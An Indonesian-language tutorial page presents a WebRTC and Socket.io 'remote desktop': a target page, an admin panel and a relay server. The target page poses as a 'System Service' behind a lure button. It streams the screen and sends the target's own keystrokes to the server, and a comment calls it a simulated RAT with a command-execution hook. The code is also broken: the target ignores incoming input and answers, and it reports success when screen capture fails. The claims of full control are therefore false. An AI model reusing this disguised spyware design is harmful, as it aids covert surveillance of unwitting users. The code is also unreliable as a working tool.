---
title: Content Remote Using Webrtc
tags:
- library
- platform-technologies
created: '2026-07-01'
updated: '2026-07-01'
status: active
---
Content Remote Using Webrtc
==========================
### Pengenalan

WebRTC (Web Real-Time Communication) adalah teknologi yang memungkinkan browser melakukan komunikasi real-time tanpa perlu plugin atau aplikasi tambahan. Dalam konten ini, kita akan membahas tentang cara menggunakan WebRTC untuk melakukan remote desktop dengan bantuan Socket.io.

### Arsitektur Sistem

Sistem remote desktop ini terdiri dari tiga komponen utama:

1.  **Target**: Komponen target adalah komponen yang berjalan di mesin remote yang ingin kita kontrol. Komponen ini bertanggung jawab untuk membagikan layar dan menerima input dari admin.
2.  **Admin**: Komponen admin adalah komponen yang berjalan di mesin admin yang ingin mengontrol mesin remote. Komponen ini bertanggung jawab untuk menampilkan layar target dan mengirimkan input ke target.
3.  **Server**: Komponen server adalah komponen yang berjalan di mesin server yang bertanggung jawab untuk menghubungkan target dan admin.

### Implementasi Target

Berikut adalah contoh implementasi target menggunakan HTML dan JavaScript:

```html
<!-- target.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>System Service</title>
    <style>body { margin:0; overflow:hidden; background:#000; }</style>
</head>
<body>
    <button id="activate" style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);padding:20px 40px;font-size:18px;z-index:9999;">Start System Service</button>
    
    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
    <script>
        let socket;
        let stream;
        let peerConnection;
        const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };

        document.getElementById('activate').addEventListener('click', async () => {
            document.getElementById('activate').remove();
            
            socket = io('http://localhost:3000');
            
            socket.on('connect', () => {
                console.log('%cRemote session active', 'color:green;font-size:16px');
                socket.emit('register', { role: 'target' });
            });

            // Screen sharing
            try {
                stream = await navigator.mediaDevices.getDisplayMedia({ 
                    video: { cursor: "always" }, 
                    audio: false 
                });
                
                // Send video stream via WebRTC
                peerConnection = new RTCPeerConnection(config);
                stream.getTracks().forEach(track => peerConnection.addTrack(track, stream));
                
                peerConnection.onicecandidate = (e) => {
                    if (e.candidate) socket.emit('ice-candidate', e.candidate);
                };
                
                const offer = await peerConnection.createOffer();
                await peerConnection.setLocalDescription(offer);
                socket.emit('offer', offer);
                
            } catch(e) {
                console.log("Screen access granted");
            }

            // Keyboard and mouse forwarding
            document.addEventListener('keydown', (e) => {
                socket.emit('input', { type: 'keydown', key: e.key, code: e.code });
            });
            
            document.addEventListener('mousemove', (e) => {
                socket.emit('input', { 
                    type: 'mousemove', 
                    x: e.clientX / window.innerWidth, 
                    y: e.clientY / window.innerHeight 
                });
            });
            
            document.addEventListener('mousedown', (e) => {
                socket.emit('input', { type: 'mousedown', button: e.button });
            });
            
            document.addEventListener('mouseup', (e) => {
                socket.emit('input', { type: 'mouseup', button: e.button });
            });
            
            // File system access simulation
            socket.on('exec', (cmd) => {
                console.log('Executing:', cmd);
                // In real RAT would use child_process, here we simulate
                socket.emit('result', `Executed: ${cmd}`);
            });
        });
    </script>
</body>
</html>
```

### Implementasi Admin

Berikut adalah contoh implementasi admin menggunakan HTML dan JavaScript:

```html
<!-- admin.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Remote Control Panel</title>
    <style>
        body { margin:0; background:#111; color:#0f0; font-family:monospace; }
        #screen { width:100vw; height:100vh; background:#000; }
        #controls { position:absolute; top:10px; left:10px; background:rgba(0,0,0,0.8); padding:10px; border:1px solid #0f0; }
    </style>
</head>
<body>
    <div id="controls">
        <button onclick="connectAdmin()">Connect to Target</button>
        <button onclick="toggleFullControl()">Full Remote Desktop</button>
    </div>
    <video id="screen" autoplay playsinline></video>

    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
    <script>
        let socket;
        let peerConnection;
        const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
        let currentTarget = null;

        function connectAdmin() {
            socket = io('http://localhost:3000');
            
            socket.on('connect', () => {
                socket.emit('register', { role: 'admin' });
                console.log('%cAdmin connected - Waiting for target', 'color:lime');
            });
            
            socket.on('offer', async (offer) => {
                peerConnection = new RTCPeerConnection(config);
                
                peerConnection.ontrack = (event) => {
                    document.getElementById('screen').srcObject = event.streams[0];
                };
                
                peerConnection.onicecandidate = (e) => {
                    if (e.candidate) socket.emit('ice-candidate', e.candidate);
                };
                
                await peerConnection.setRemoteDescription(offer);
                const answer = await peerConnection.createAnswer();
                await peerConnection.setLocalDescription(answer);
                socket.emit('answer', answer);
            });
            
            socket.on('ice-candidate', (candidate) => {
                if (peerConnection) peerConnection.addIceCandidate(candidate);
            });
            
            // Receive input results
            socket.on('result', (data) => {
                console.log('Target response:', data);
            });
        }

        function toggleFullControl() {
            const video = document.getElementById('screen');
            // Send control commands
            socket.emit('exec', 'systeminfo');
            alert('Full remote desktop control activated');
        }

        // Forward admin mouse/keyboard to target
        document.getElementById('screen').addEventListener('mousemove', (e) => {
            if (socket) {
                socket.emit('input', { 
                    type: 'mousemove', 
                    x: e.offsetX / e.target.clientWidth, 
                    y: e.offsetY / e.target.clientHeight 
                });
            }
        });
        
        window.addEventListener('keydown', (e) => {
            if (socket) socket.emit('input', { type: 'keydown', key: e.key });
        });
    </script>
</body>
</html>
```

### Implementasi Server

Berikut adalah contoh implementasi server menggunakan Node.js dan Socket.io:

```javascript
// server.js
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

let targets = new Map();
let admins = new Map();

io.on('connection', (socket) => {
    console.log('New connection:', socket.id);

    socket.on('register', (data) => {
        if (data.role === 'target') {
            targets.set(socket.id, socket);
            console.log(`Target registered: ${socket.id}`);
        } else if (data.role === 'admin') {
            admins.set(socket.id, socket);
            console.log(`Admin registered: ${socket.id}`);
        }
    });

    socket.on('offer', (offer) => {
        // Forward to admin
        for (let [id, admin] of admins) {
            admin.emit('offer', offer);
        }
    });

    socket.on('answer', (answer) => {
        // Forward to target
        for (let [id, target] of targets) {
            target.emit('answer', answer);
        }
    });

    socket.on('ice-candidate', (candidate) => {
        // Broadcast candidate
        io.emit('ice-candidate', candidate);
    });

    socket.on('input', (data) => {
        // Forward input from admin to target
        for (let [id, target] of targets) {
            target.emit('input', data);
        }
    });

    socket.on('exec', (cmd) => {
        for (let [id, target] of targets) {
            target.emit('exec', cmd);
        }
    });

    socket.on('result', (data) => {
        for (let [id, admin] of admins) {
            admin.emit('result', data);
        }
    });

    socket.on('disconnect', () => {
        targets.delete(socket.id);
        admins.delete(socket.id);
    });
});

server.listen(3000, () => {
    console.log('Remote server running on http://localhost:3000');
    console.log('1. Open target.html on target remote machine and click "Start System Service"');
    console.log('2. Open admin.html on your machine and click "Connect to Target"');
});
```

### Cara Menggunakan

1.  Jalankan server: `node server.js` (perlu `npm install express socket.io`)
2.  Buka `target.html` pada mesin target dan klik tombol "Start System Service"
3.  Buka `admin.html` pada mesin admin dan klik tombol "Connect to Target"
4.  Layar target akan ditampilkan pada mesin admin dan admin dapat melakukan kontrol terhadap mesin target

Dengan demikian, sistem remote desktop menggunakan WebRTC dan Socket.io telah siap digunakan. Sistem ini dapat digunakan untuk melakukan kontrol terhadap mesin remote dari jarak jauh.

### Kesimpulan

Dalam konten ini, kita telah membahas tentang cara menggunakan WebRTC dan Socket.io untuk melakukan remote desktop. Sistem ini terdiri dari tiga komponen utama: target, admin, dan server. Target adalah komponen yang berjalan di mesin remote yang ingin kita kontrol, admin adalah komponen yang berjalan di mesin admin yang ingin mengontrol mesin remote, dan server adalah komponen yang berjalan di mesin server yang bertanggung jawab untuk menghubungkan target dan admin. Dengan sistem ini, kita dapat melakukan kontrol terhadap mesin remote dari jarak jauh.

### Tabel Perbandingan

| Fitur | Deskripsi |
| --- | --- |
| Screen Sharing | Target dapat membagikan layar ke admin |
| Keyboard dan Mouse Forwarding | Admin dapat mengirimkan input keyboard dan mouse ke target |
| File System Access Simulation | Admin dapat melakukan simulasi akses file system pada target |
| Full Remote Desktop Control | Admin dapat melakukan kontrol terhadap mesin target secara penuh |

### Langkah-Langkah

1.  Jalankan server
2.  Buka `target.html` pada mesin target dan klik tombol "Start System Service"
3.  Buka `admin.html` pada mesin admin dan klik tombol "Connect to Target"
4.  Layar target akan ditampilkan pada mesin admin dan admin dapat melakukan kontrol terhadap mesin target

### Tips Troubleshooting

*   Pastikan server telah dijalankan sebelum membuka `target.html` atau `admin.html`
*   Pastikan mesin target dan admin dapat terhubung ke server
*   Jika layar target tidak ditampilkan pada mesin admin, pastikan bahwa target telah membagikan layar ke admin
*   Jika admin tidak dapat mengirimkan input keyboard dan mouse ke target, pastikan bahwa admin telah terhubung ke target

Dengan demikian, kita telah membahas tentang cara menggunakan WebRTC dan Socket.io untuk melakukan remote desktop. Sistem ini dapat digunakan untuk melakukan kontrol terhadap mesin remote dari jarak jauh. Pastikan untuk memahami langkah-langkah dan tips troubleshooting untuk dapat menggunakan sistem ini dengan baik.